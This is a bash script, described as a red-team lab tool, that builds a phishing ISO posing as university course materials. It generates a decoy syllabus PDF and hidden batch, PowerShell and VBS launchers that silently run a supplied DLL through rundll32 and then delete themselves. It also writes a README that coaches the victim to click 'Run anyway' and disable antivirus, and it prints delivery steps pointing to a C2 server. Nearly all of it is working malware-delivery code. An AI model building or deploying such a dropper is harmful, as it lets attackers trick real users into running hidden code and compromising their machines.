#!/bin/bash
#
# ISO Payload Generator for Red Team Lab
# FIXED VERSION - Uses Windows LNK shortcut via PowerShell
# Usage: ./create-iso.sh <dll_path> <output_name>
#

set -e

# ==================== CONFIGURATION ====================
DECOY_PDF_URL="https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf"
OUTPUT_DIR="./iso_build"
FINAL_ISO_NAME="${2:-CourseMaterials}"
# =======================================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

banner() {
    echo -e "${CYAN}"
    echo "╔══════════════════════════════════════════════════════════╗"
    echo "║           ISO PAYLOAD GENERATOR - RED TEAM LAB           ║"
    echo "║                   FIXED VERSION                          ║"
    echo "╚══════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

usage() {
    echo -e "${YELLOW}Usage: $0 <dll_path> [output_name]${NC}"
    echo ""
    echo "Arguments:"
    echo "  dll_path      - Path to your compiled DLL payload"
    echo "  output_name   - Name for the ISO file (default: CourseMaterials)"
    echo ""
    echo "Example:"
    echo "  $0 ./dread.dll FinalProject"
    exit 1
}

check_dependencies() {
    echo -e "${BLUE}[*] Checking dependencies...${NC}"
    
    local missing=0
    
    if ! command -v genisoimage &> /dev/null && ! command -v mkisofs &> /dev/null; then
        echo -e "${RED}[-] genisoimage/mkisofs not found. Install with: apt install genisoimage${NC}"
        missing=1
    fi
    
    if ! command -v curl &> /dev/null; then
        echo -e "${RED}[-] curl not found. Install with: apt install curl${NC}"
        missing=1
    fi
    
    if [ $missing -eq 1 ]; then
        exit 1
    fi
    
    echo -e "${GREEN}[+] All dependencies satisfied${NC}"
}

download_decoy() {
    echo -e "${BLUE}[*] Downloading decoy PDF...${NC}"
    
    if curl -s -o "$OUTPUT_DIR/Course_Syllabus.pdf" "$DECOY_PDF_URL"; then
        echo -e "${GREEN}[+] Decoy PDF downloaded${NC}"
    else
        # Create a simple PDF if download fails
        echo -e "${YELLOW}[!] Download failed, creating dummy PDF${NC}"
        cat > "$OUTPUT_DIR/Course_Syllabus.pdf" << 'EOF'
%PDF-1.4
1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj
2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj
3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >> endobj
4 0 obj << /Length 44 >>
stream
BT /F1 24 Tf 100 700 Td (Course Materials - Confidential) Tj ET
endstream
endobj
xref
0 5
0000000000 65535 f
0000000010 00000 n
0000000079 00000 n
0000000173 00000 n
0000000301 00000 n
trailer << /Size 5 /Root 1 0 R >>
startxref
400
%%EOF
EOF
    fi
}

create_powershell_launcher() {
    echo -e "${BLUE}[*] Creating PowerShell launcher script...${NC}"
    
    cat > "$OUTPUT_DIR/SystemHelper.ps1" << 'EOF'
# Course Materials Helper
# This script opens the syllabus and loads required components

# Open the PDF for the user
$pdfPath = Join-Path $PSScriptRoot "Course_Syllabus.pdf"
if (Test-Path $pdfPath) {
    Start-Process $pdfPath
}

# Wait a moment for PDF to open
Start-Sleep -Seconds 2

# Load the system component
$dllPath = Join-Path $PSScriptRoot "SystemUpdate.cache"
if (Test-Path $dllPath) {
    Start-Process rundll32.exe -ArgumentList "$dllPath,Start" -WindowStyle Hidden
}

# Self-delete this script after 3 seconds
Start-Sleep -Seconds 3
Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
EOF
    
    echo -e "${GREEN}[+] PowerShell launcher created${NC}"
}

create_batch_launcher() {
    echo -e "${BLUE}[*] Creating batch file launcher...${NC}"
    
    cat > "$OUTPUT_DIR/Open_Syllabus.bat" << 'EOF'
@echo off
:: Course Materials Launcher
:: This file opens your syllabus

title Course Materials

:: Open the PDF
if exist "%~dp0Course_Syllabus.pdf" (
    start "" "%~dp0Course_Syllabus.pdf"
)

:: Wait 2 seconds
timeout /t 2 /nobreak > nul

:: Launch the PowerShell script hidden
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "%~dp0SystemHelper.ps1"

:: Self-delete
timeout /t 2 /nobreak > nul
del /f /q "%~f0" > nul 2>&1
EOF
    
    echo -e "${GREEN}[+] Batch launcher created${NC}"
}

create_vbs_launcher() {
    echo -e "${BLUE}[*] Creating VBS fallback launcher...${NC}"
    
    cat > "$OUTPUT_DIR/SystemHelper.vbs" << 'EOF'
On Error Resume Next

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

scriptPath = WScript.ScriptFullName
scriptDir = objFSO.GetParentFolderName(scriptPath)

' Open PDF
pdfPath = scriptDir & "\Course_Syllabus.pdf"
If objFSO.FileExists(pdfPath) Then
    objShell.Run "rundll32.exe shell32.dll,OpenAs_RunDLL """ & pdfPath & """", 0, False
End If

WScript.Sleep 2000

' Execute DLL
dllPath = scriptDir & "\SystemUpdate.cache"
If objFSO.FileExists(dllPath) Then
    objShell.Run "rundll32.exe """ & dllPath & """,Start", 0, False
End If

' Self-delete
WScript.Sleep 3000
objFSO.DeleteFile scriptPath, True
EOF
    
    echo -e "${GREEN}[+] VBS fallback launcher created${NC}"
}

create_readme() {
    echo -e "${BLUE}[*] Creating README with instructions...${NC}"
    
    cat > "$OUTPUT_DIR/README.txt" << 'EOF'
===================================================
           COURSE MATERIALS - SPRING 2024
===================================================

INSTRUCTIONS:
1. Double-click "Open_Syllabus.bat" to view the syllabus
2. If Windows asks for permission, click "More info" then "Run anyway"
3. The syllabus PDF will open automatically

ALTERNATIVE METHOD:
- If the batch file doesn't work, double-click "SystemHelper.vbs"

NOTE: This ISO contains protected course materials.
Do not distribute outside the university network.

===================================================
TROUBLESHOOTING:
===================================================
- Make sure Windows is up to date
- Disable any third-party antivirus temporarily
- Right-click the ISO and select "Mount" if it doesn't auto-mount

===================================================
EOF
    
    echo -e "${GREEN}[+] README created${NC}"
}

copy_payload() {
    local dll_path="$1"
    
    echo -e "${BLUE}[*] Copying payload DLL...${NC}"
    
    if [ ! -f "$dll_path" ]; then
        echo -e "${RED}[-] DLL not found: $dll_path${NC}"
        exit 1
    fi
    
    cp "$dll_path" "$OUTPUT_DIR/SystemUpdate.cache"
    
    echo -e "${GREEN}[+] Payload copied as SystemUpdate.cache${NC}"
}

build_iso() {
    echo -e "${BLUE}[*] Building ISO image...${NC}"
    
    cd "$OUTPUT_DIR"
    
    local iso_cmd=""
    if command -v genisoimage &> /dev/null; then
        iso_cmd="genisoimage"
    elif command -v mkisofs &> /dev/null; then
        iso_cmd="mkisofs"
    fi
    
    # Build ISO with hidden payload files
    $iso_cmd -J -R \
        -hide SystemUpdate.cache \
        -hide SystemHelper.ps1 \
        -hide SystemHelper.vbs \
        -hide-joliet SystemUpdate.cache \
        -hide-joliet SystemHelper.ps1 \
        -hide-joliet SystemHelper.vbs \
        -V "Course Materials" \
        -o "../${FINAL_ISO_NAME}.iso" \
        . 2>/dev/null
    
    cd ..
    
    echo -e "${GREEN}[+] ISO created: ${FINAL_ISO_NAME}.iso${NC}"
}

cleanup() {
    echo -e "${BLUE}[*] Cleaning up build directory...${NC}"
    rm -rf "$OUTPUT_DIR"
    echo -e "${GREEN}[+] Cleanup complete${NC}"
}

summary() {
    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════╗"
    echo -e "║                    BUILD COMPLETE                        ║"
    echo -e "╠══════════════════════════════════════════════════════════╣"
    echo -e "║  ISO File:     ${GREEN}${FINAL_ISO_NAME}.iso${CYAN}"
    echo -e "╠══════════════════════════════════════════════════════════╣"
    echo -e "║  DELIVERY INSTRUCTIONS:                                  ║"
    echo -e "║  1. Send ${FINAL_ISO_NAME}.iso to target                 ║"
    echo -e "║  2. Instruct user to double-click the ISO                ║"
    echo -e "║  3. Then double-click Open_Syllabus.bat                  ║"
    echo -e "║  4. Wait for beacon at C2 server                         ║"
    echo -e "╠══════════════════════════════════════════════════════════╣"
    echo -e "║  C2 Server: ${YELLOW}https://unimportant.onrender.com${CYAN}                  ║"
    echo -e "╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}[!] REMINDER: For lab/VM use only.${NC}"
    echo ""
}

main() {
    banner
    
    if [ -z "$1" ]; then
        usage
    fi
    
    local dll_path="$1"
    
    check_dependencies
    mkdir -p "$OUTPUT_DIR"
    
    download_decoy
    create_powershell_launcher
    create_batch_launcher
    create_vbs_launcher
    create_readme
    copy_payload "$dll_path"
    
    build_iso
    cleanup
    summary
}

main "$@"
